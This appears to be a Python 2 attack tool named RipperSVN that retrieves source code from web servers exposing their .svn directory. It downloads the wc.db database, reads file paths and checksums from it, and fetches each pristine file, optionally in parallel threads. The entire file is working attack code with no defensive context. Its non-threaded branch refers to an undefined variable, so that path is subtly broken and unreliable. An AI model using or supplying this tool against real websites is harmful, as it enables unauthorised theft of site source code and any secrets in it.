import sqlite3
from http import HTTP
import os
import concurrent.futures

class RipperSVN(object):
    def __init__(self, vulnerability, threads=0):
        self.vulnerability = vulnerability
        self.host = vulnerability['host']
        self.session = HTTP()
        self.output_folder = "output/{}/".format(self.host.host)
        self.threads = threads


    def parse_wc(self):
        self.session.get_file("", self.output_folder + "wc.db", with_data=self.vulnerability['data'])
        print "Wrote wc.db to disk"

        conn = sqlite3.connect(self.output_folder + 'wc.db')
        c = conn.cursor()
        files = []

        for row in c.execute('select local_relpath, checksum from NODES'):
            try:
                path = ".svn/pristine/" + row[1][6:8] + "/" + row[1][6:] + ".svn-base"
                url = self.host.replace(path=path)
                filename = row[0]

                if not os.path.exists(self.output_folder + filename):
                    files.append((url, self.output_folder + filename))

            except:
                pass


        if self.threads:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                for file in files:
                    executor.submit(self.session.get_file, file[0], file[1])
        else:
            self.session.get_file(file[0], file[1])